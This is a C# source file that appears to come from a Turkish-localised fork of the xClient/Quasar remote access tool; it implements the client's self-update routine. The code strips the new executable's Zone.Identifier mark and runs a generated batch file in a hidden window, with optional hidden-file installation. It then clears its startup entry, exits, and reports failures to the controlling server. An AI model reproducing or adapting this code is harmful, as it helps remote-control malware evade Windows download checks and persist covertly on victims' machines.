using System;
using System.Diagnostics;
using System.IO;
using xClient.Ayarlar;
using xClient.KuuhakuÇekirdek.Ağ;
using xClient.KuuhakuÇekirdek.Paketler.ClientPaketleri;
using xClient.KuuhakuÇekirdek.Utilityler;
using xClient.KuuhakuÇekirdek.Yardımcılar;

namespace xClient.KuuhakuÇekirdek.Kurulum
{
    public static class ClientGüncelleyici
    {
        public static void Update(Client client, string newFilePath)
        {
            try
            {
                DosyaYardımcısı.DeleteZoneIdentifier(newFilePath);

                var bytes = File.ReadAllBytes(newFilePath);
                if (!DosyaYardımcısı.ExeValidmiKardeş(bytes))
                    throw new Exception("Pe Dosyası Bulunamadı");

                var batchFile = DosyaYardımcısı.GüncellemeBatı(newFilePath, Settings.INSTALL && Settings.HIDEFILE);

                if (string.IsNullOrEmpty(batchFile))
                    throw new Exception("Güncelleme Bat Dosyası Oluşturulamadı.");

                var startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    FileName = batchFile
                };
                Process.Start(startInfo);

                if (Settings.STARTUP)
                    Başlangıç.RemoveFromStartup();

                Program.ConnectClient.Exit();
            }
            catch (Exception ex)
            {
                NativeMethods.DeleteFile(newFilePath);
                new SetStatus(string.Format("Güncelleme Başarısız Oldu: {0}", ex.Message)).Execute(client);
            }
        }
    }
}